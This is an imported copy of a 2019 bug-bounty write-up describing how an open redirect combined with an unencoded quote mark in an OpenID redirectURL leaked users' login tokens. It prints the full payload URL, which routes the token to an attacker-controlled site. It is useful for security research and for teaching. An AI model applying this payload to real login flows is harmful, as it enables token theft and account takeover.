---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2019-05-21_leaking-openid-tokens-with-the-bug-right-infront-of-you.md
original_filename: 2019-05-21_leaking-openid-tokens-with-the-bug-right-infront-of-you.md
title: Leaking OpenID tokens with “ — the bug right infront of you
category: documents
detected_topics:
- oauth
- command-injection
- otp
tags:
- imported
- documents
- oauth
- command-injection
- otp
language: en
raw_sha256: e3e4ace7839cdfd71fe4dd978910c18454cb8fc3699237d0e236f8fc907dc785
text_sha256: 7e0bf800e9024b1354e8b0de17241e56658f52f284fd552cab7bf5c82636aa3d
ingested_at: '2026-06-28T07:31:59Z'
sensitivity: unknown
redactions_applied: false
---

# Leaking OpenID tokens with “ — the bug right infront of you

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2019-05-21_leaking-openid-tokens-with-the-bug-right-infront-of-you.md
- Source Type: markdown
- Detected Topics: oauth, command-injection, otp
- Ingested At: 2026-06-28T07:31:59Z
- Redactions Applied: False
- Raw SHA256: `e3e4ace7839cdfd71fe4dd978910c18454cb8fc3699237d0e236f8fc907dc785`
- Text SHA256: `7e0bf800e9024b1354e8b0de17241e56658f52f284fd552cab7bf5c82636aa3d`


## Content

---
title: "Leaking OpenID tokens with “ — the bug right infront of you"
page_title: "Leaking OpenID tokens with “ — the bug right infront of you | by Sean (zseano) | InfoSec Write-ups"
url: "https://medium.com/@zseano/leaking-openid-tokens-with-the-bug-right-infront-of-you-95c1fb4a86e9"
authors: ["Zseano (@zseano)"]
bugs: ["OIDC", "Open redirect", "Token leak"]
publication_date: "2019-05-21"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 5253
scraped_via: "browseros"
---

# Leaking OpenID tokens with “ — the bug right infront of you

Leaking OpenID tokens with “ — the bug right infront of you
Sean (zseano)
Follow
3 min read
·
May 22, 2019

180

1

This is only going to be a short post explaining the details of a vulnerability I found which I believe many researchers overlooked when testing the login flow of one program. This bug may affect other sites using an OpenID login flow, I would recommend testing :) (It is best if they have misconfigured their redirectURL to allow for *.theirdomain.com/* as your scope for finding an open url redirect will be greater)

The Login flow

So, on with the bug. When logging into redacted.com it used an OpenID system which works exactly the same as an Oauth login flow in which it takes a redirectURL and will redirect to that URL upon a successful login. Along with the redirect a token is sent, and as a hacker, I want this token!

https://www.redacted.com/login?redirectURL=/here

I could input *.redated.com into the redirectURL parameter and it would redirect. I quickly found an open url redirect but sadly on the final redirect to my site the users login token wasn’t appended since it was set on a hashfragment. (#) Sadface.jpeg

My first thought was, what would happen if I nested it in a parameter with quote marks? I was hoping when redirecting it would treat the users login token as a parameter value in quotes. Looking back, since it’s set in a hashfragment, I have no idea why I thought this. But this goes to show that you can never be wrong with hacking & testing things.. chuck what you want at it and see what happens! :)

So this was the vulnerable URL:

https://www.redacted.com/login?redirectURL=https%3A%2F%2Fevil.redacted.com%2Fredirect%3Furl%3Dhttps%3A%2F%2Fwww.mysite.com%2F?c="

And when I tested, the bug worked!.. but not how I expected. I had however successfully obtained my token on the attackers site. Happyface.jpeg

Get Sean (zseano)’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Remember me for faster sign in

Now I just need to work out how and what happened.

Well when testing login flows and wanting them to redirect to my website after a successful login, I will always encode (and sometimes double encode) to make sure when redirecting the browser is decoding values in the correct order. Understanding how a site handles certain encodings is important. (especially when needing to find filter bypasses:D)

For example: the payload below may not successfully redirect to your intended destination without encoding (and like I said, sometimes double encoding, %252F, this will become evident when you are testing).

, https://www.redacted.com/login?redirectURL=https://evil.redcated.com/redirect?url=https://myevilsite.com/

But anyway, back to the actual bug. If you notice I actually left one character unencoded… the quote mark! “ — I was just testing to see what would happen I could nest parameters in a quote remember? However before redirecting to my website, redacted.com actually encoded “ to &#34; — and thanks to this simple encoding it enabled the users login token to be smuggled through with the redirect to my website. If I had used %22 then no token was leaked. It had to be “ — exactly that. No quote mark, no token leaked.

Final payload was literally just https://www.redacted.com/login?redirectURL=https%3A%2F%2Fevil.redacted.com%2Fredirect%3Furl%3Dhttps%3A%2F%2Fwww.mysite.com%2F?c=" and upon the user logging in, their login token was sent to the attackers server. Again, without “, the bug did not work. But thanks to “, I was now this user :)

Takeaways

There is no right or wrong answer when it comes to hacking. Unless you try, how will you know? I find the majority of my bugs from manually interacting with features and trying to break them and the beauty of hacking is: you can try anything! Literally anything (within reason of course…!)

So there we have it, something so simple right infront of everyone with huge impact. As explained in the opening post, this may affect more programs since it’s a pretty popular login flow used by many sites but it’s also dependent on how the site handles the encoding of certain characters and if they have misconfigured the redirectURL etc :)

happy hunting & hacking ❤

-zseano
